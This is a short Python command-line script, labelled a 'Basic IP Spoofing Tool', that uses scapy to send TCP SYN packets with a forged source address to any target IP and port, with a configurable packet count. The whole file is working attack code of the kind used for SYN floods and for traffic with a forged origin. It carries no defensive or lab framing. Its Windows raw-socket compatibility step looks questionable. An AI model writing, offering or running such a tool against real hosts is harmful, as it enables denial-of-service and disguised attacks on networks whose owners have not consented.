#!/usr/bin/env python3
import argparse
from scapy.all import IP, TCP, send
import random
import platform

def spoof_packet(target_ip, target_port, spoof_ip, count):
    """Send spoofed TCP SYN packets"""
    print(f"[*] Starting IP spoofer (Ctrl+C to stop)")
    print(f"[*] Target: {target_ip}:{target_port}")
    print(f"[*] Spoofing IP: {spoof_ip}")
    print(f"[*] Sending {count} packets\n")

    try:
        for _ in range(count):
            # Generate random source port
            src_port = random.randint(1024, 65535)
            
            # Craft IP layer with spoofed source
            ip_layer = IP(src=spoof_ip, dst=target_ip)
            
            # Craft TCP SYN packet
            tcp_layer = TCP(sport=src_port, dport=target_port, flags="S")
            
            # Combine layers and send
            packet = ip_layer/tcp_layer
            send(packet, verbose=0)
            
            print(f"Sent spoofed packet from {spoof_ip}:{src_port} to {target_ip}:{target_port}")

    except KeyboardInterrupt:
        print("\n[!] Stopped by user")
    except Exception as e:
        print(f"\n[!] Error: {e}")

if __name__ == "__main__":
    # Platform check for Windows
    if platform.system().lower() == "windows":
        from scapy.arch.windows import compatibility
        compatibility.CAN_USE_RAW_SOCKET = True  # Required for Windows raw sockets

    parser = argparse.ArgumentParser(description="Basic IP Spoofing Tool")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("-s", "--spoof", required=True, help="Spoofed source IP address")
    parser.add_argument("-c", "--count", type=int, default=5, help="Number of packets to send (default: 5)")

    args = parser.parse_args()

    spoof_packet(args.target, args.port, args.spoof, args.count)